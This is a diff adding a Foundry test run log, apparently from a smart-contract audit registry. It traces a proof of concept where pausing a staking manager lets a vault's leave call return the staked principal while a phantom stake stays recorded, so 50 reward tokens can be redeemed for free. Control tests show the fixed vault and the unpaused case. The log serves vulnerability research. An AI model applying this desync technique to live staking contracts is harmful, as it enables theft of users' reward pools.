@@ -1,0 +1,316 @@
+Compiling 21 files with Solc 0.8.27
+Solc 0.8.27 finished in 2.12s
+Compiler run successful!
+
+Ran 3 tests for test/65325-malicious-actors-can-get-free-rewards-if-contract-gets-pause_exp.sol:FreeRewardsOnPauseTest
+[PASS] test_control_fixed_pausedLeaveReverts() (gas: 1555880)
+Traces:
+  [1595680] FreeRewardsOnPauseTest::test_control_fixed_pausedLeaveReverts()
+    ├─ [319688] → new MiniToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x53544b0000000000000000000000000000000000000000000000000000000006
+    │   │   @ 0: 0 → 0x5374616b696e670000000000000000000000000000000000000000000000000e
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [319688] → new MiniToken@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x53544f4c454e2d5245574152440000000000000000000000000000000000001a
+    │   │   @ 0: 0 → 0x526577617264000000000000000000000000000000000000000000000000000c
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [252846] → new StakeManager@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   @ 1: 0 → 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    │   └─ ← [Return] 929 bytes of code
+    ├─ [308753] → new StakeVaultFixed@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a
+    │   │   @ 0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Return] 1319 bytes of code
+    ├─ [44724] MiniToken::mint(StakeManager: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 0x7af47a8bdf279823af6da3c175ca7f26d1450816a1c9a65abbca4ba9840db69d: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Stop]
+    ├─ [44724] MiniToken::mint(FreeRewardsOnPauseTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Stop]
+    ├─ [22492] MiniToken::approve(StakeVaultFixed: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 0xb334aeba1bf37cf3bbd857e831222d3247ae9c5d0e86a12593925f4223cb7cbe: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Return] true
+    ├─ [91570] StakeVaultFixed::stake(1000000000000000000000 [1e21], 0)
+    │   ├─ [23368] MiniToken::transferFrom(FreeRewardsOnPauseTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], StakeVaultFixed: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 0xb334aeba1bf37cf3bbd857e831222d3247ae9c5d0e86a12593925f4223cb7cbe: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─ [22465] StakeManager::stake(1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 3: 0 → 1
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Stop]
+    ├─ [489] StakeManager::pause()
+    │   ├─  storage changes:
+    │   │   @ 2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x0000000000000000000000017fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Stop]
+    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 3e2e2fcf00000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ [23484] StakeVaultFixed::leave(0x1111111111111111111111111111111111111111)
+    │   ├─ [431] StakeManager::leave()
+    │   │   └─ ← [Revert] StakeManager__Paused()
+    │   ├─  storage changes:
+    │   │   @ 4: 0 → 1
+    │   └─ ← [Revert] StakeManager__Paused()
+    ├─ [2530] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "fixed vault returns no tokens while paused") [staticcall]
+    │   └─ ← [Return]
+    ├─ [24074] StakeManager::redeemRewards(StakeVaultFixed: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 0x1111111111111111111111111111111111111111)
+    │   ├─ [22980] MiniToken::transfer(0x1111111111111111111111111111111111111111, 50000000000000000000 [5e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x7af47a8bdf279823af6da3c175ca7f26d1450816a1c9a65abbca4ba9840db69d: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x0000000000000000000000000000000000000000000000337fe5feaf2d180000
+    │   │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 50000000000000000000 [5e19]
+    ├─ [0] VM::assertGt(50000000000000000000 [5e19], 0, "stake still recorded, but principal is locked in the vault") [staticcall]
+    │   └─ ← [Return]
+    ├─ [530] MiniToken::balanceOf(StakeVaultFixed: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "principal remains locked in the vault") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_control_noPause_noFreeRewards() (gas: 1505734)
+Traces:
+  [1605234] FreeRewardsOnPauseTest::test_control_noPause_noFreeRewards()
+    ├─ [319688] → new MiniToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x5374616b696e670000000000000000000000000000000000000000000000000e
+    │   │   @ 1: 0 → 0x53544b0000000000000000000000000000000000000000000000000000000006
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [319688] → new MiniToken@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x53544f4c454e2d5245574152440000000000000000000000000000000000001a
+    │   │   @ 0: 0 → 0x526577617264000000000000000000000000000000000000000000000000000c
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [252846] → new StakeManager@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   @ 2: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 1: 0 → 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    │   └─ ← [Return] 929 bytes of code
+    ├─ [314960] → new StakeVault@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 1: 0 → 0x000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a
+    │   └─ ← [Return] 1350 bytes of code
+    ├─ [44724] MiniToken::mint(StakeManager: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 0x7af47a8bdf279823af6da3c175ca7f26d1450816a1c9a65abbca4ba9840db69d: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Stop]
+    ├─ [44724] MiniToken::mint(FreeRewardsOnPauseTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Stop]
+    ├─ [22492] MiniToken::approve(StakeVault: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 0xb334aeba1bf37cf3bbd857e831222d3247ae9c5d0e86a12593925f4223cb7cbe: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Return] true
+    ├─ [91570] StakeVault::stake(1000000000000000000000 [1e21], 0)
+    │   ├─ [23368] MiniToken::transferFrom(FreeRewardsOnPauseTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], StakeVault: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb334aeba1bf37cf3bbd857e831222d3247ae9c5d0e86a12593925f4223cb7cbe: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─ [22465] StakeManager::stake(1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 3: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [48428] StakeVault::leave(0x1111111111111111111111111111111111111111)
+    │   ├─ [581] StakeManager::leave()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [530] MiniToken::balanceOf(StakeVault: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   ├─ [22980] MiniToken::transfer(0x1111111111111111111111111111111111111111, 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 4: 0 → 1
+    │   │   @ 2: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   └─ ← [Return]
+    ├─ [516] StakeManager::staked(StakeVault: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "stake cleared on clean leave") [staticcall]
+    │   └─ ← [Return]
+    ├─ [530] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "principal returned") [staticcall]
+    │   └─ ← [Return]
+    ├─ [4174] StakeManager::redeemRewards(StakeVault: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 0x1111111111111111111111111111111111111111)
+    │   ├─ [3080] MiniToken::transfer(0x1111111111111111111111111111111111111111, 0)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "no rewards on a properly-cleared stake") [staticcall]
+    │   └─ ← [Return]
+    ├─ [530] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "attacker gets no free rewards without the pause desync") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_exploit_pausedLeaveGivesFreeRewards() (gas: 3194615)
+Traces:
+  [3274215] FreeRewardsOnPauseTest::test_exploit_pausedLeaveGivesFreeRewards()
+    ├─ [1448123] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 7233 bytes of code
+    ├─ [1774495] Exploit::run()
+    │   ├─ [319688] → new MiniToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x53544b0000000000000000000000000000000000000000000000000000000006
+    │   │   │   @ 0: 0 → 0x5374616b696e670000000000000000000000000000000000000000000000000e
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─ [319688] → new MiniToken@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x526577617264000000000000000000000000000000000000000000000000000c
+    │   │   │   @ 1: 0 → 0x53544f4c454e2d5245574152440000000000000000000000000000000000001a
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─ [252846] → new StakeManager@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   │   @ 2: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 929 bytes of code
+    │   ├─ [314960] → new StakeVault@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   └─ ← [Return] 1350 bytes of code
+    │   ├─ [44724] MiniToken::mint(StakeManager: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x39ca2902e4da2862e9016cc5f214372696deb2dcca85905398c43378e0fbbe48: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─ [44724] MiniToken::mint(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─ [22492] MiniToken::approve(StakeVault: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfea26860e38289d006bdf7efe1164013a8dc224193fc16e58a094d37b2d9c799: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Return] true
+    │   ├─ [91570] StakeVault::stake(1000000000000000000000 [1e21], 0)
+    │   │   ├─ [23368] MiniToken::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], StakeVault: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   │   @ 0xba24e7e6b4df34f8c31e4519b991325a0ca6aa99983a680ca2a69b3c77f789d0: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   @ 0xfea26860e38289d006bdf7efe1164013a8dc224193fc16e58a094d37b2d9c799: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [22465] StakeManager::stake(1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xba24e7e6b4df34f8c31e4519b991325a0ca6aa99983a680ca2a69b3c77f789d0: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 3: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [489] StakeManager::pause()
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f → 0x0000000000000000000000015615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   └─ ← [Stop]
+    │   ├─ [48150] StakeVault::leave(0x1111111111111111111111111111111111111111)
+    │   │   ├─ [431] StakeManager::leave()
+    │   │   │   └─ ← [Revert] StakeManager__Paused()
+    │   │   ├─ [530] MiniToken::balanceOf(StakeVault: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   │   ├─ [22980] MiniToken::transfer(0x1111111111111111111111111111111111111111, 1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   @ 0xba24e7e6b4df34f8c31e4519b991325a0ca6aa99983a680ca2a69b3c77f789d0: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 0 → 1
+    │   │   │   @ 2: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   └─ ← [Return]
+    │   ├─ [24074] StakeManager::redeemRewards(StakeVault: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0x1111111111111111111111111111111111111111)
+    │   │   ├─ [22980] MiniToken::transfer(0x1111111111111111111111111111111111111111, 50000000000000000000 [5e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x39ca2902e4da2862e9016cc5f214372696deb2dcca85905398c43378e0fbbe48: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x0000000000000000000000000000000000000000000000337fe5feaf2d180000
+    │   │   │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 50000000000000000000 [5e19]
+    │   ├─ [530] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   ├─ [530] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   │   └─ ← [Return] 50000000000000000000 [5e19]
+    │   ├─ [516] StakeManager::staked(StakeVault: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 4: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 3: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 5: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
+    │   │   @ 6: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 0: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   @ 2: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return]
+    ├─ [283] Exploit::attackerStakingRestored() [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "attacker principal fully restored") [staticcall]
+    │   └─ ← [Return]
+    ├─ [327] Exploit::attackerRewardStolen() [staticcall]
+    │   └─ ← [Return] 50000000000000000000 [5e19]
+    ├─ [0] VM::assertEq(50000000000000000000 [5e19], 50000000000000000000 [5e19], "attacker drained free rewards") [staticcall]
+    │   └─ ← [Return]
+    ├─ [327] Exploit::attackerRewardStolen() [staticcall]
+    │   └─ ← [Return] 50000000000000000000 [5e19]
+    ├─ [0] VM::assertGt(50000000000000000000 [5e19], 0, "free rewards extracted") [staticcall]
+    │   └─ ← [Return]
+    ├─ [396] Exploit::phantomStakeRecorded() [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "manager retains phantom stake") [staticcall]
+    │   └─ ← [Return]
+    ├─ [437] Exploit::rewardTokenAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [271] Exploit::managerAddr() [staticcall]
+    │   └─ ← [Return] StakeManager: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]
+    ├─ [530] MiniToken::balanceOf(StakeManager: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [staticcall]
+    │   └─ ← [Return] 950000000000000000000 [9.5e20]
+    ├─ [0] VM::assertEq(950000000000000000000 [9.5e20], 950000000000000000000 [9.5e20], "reward pool drained") [staticcall]
+    │   └─ ← [Return]
+    ├─ [530] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 50000000000000000000 [5e19]
+    ├─ [0] VM::assertEq(50000000000000000000 [5e19], 50000000000000000000 [5e19], "attacker holds the stolen rewards") [staticcall]
+    │   └─ ← [Return]
+    ├─ [329] Exploit::stakingTokenAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [395] Exploit::vaultAddr() [staticcall]
+    │   └─ ← [Return] StakeVault: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]
+    ├─ [530] MiniToken::balanceOf(StakeVault: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "vault returned all staked tokens") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.51ms (3.27ms CPU time)
+
+Ran 1 test suite in 126.09ms (1.51ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
+_shared/run-poc/run_poc.sh: line 71:  7467 Killed: 9               nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/65325-malicious-actors-can-get-free-rewards-if-contract-gets-pause_exp)
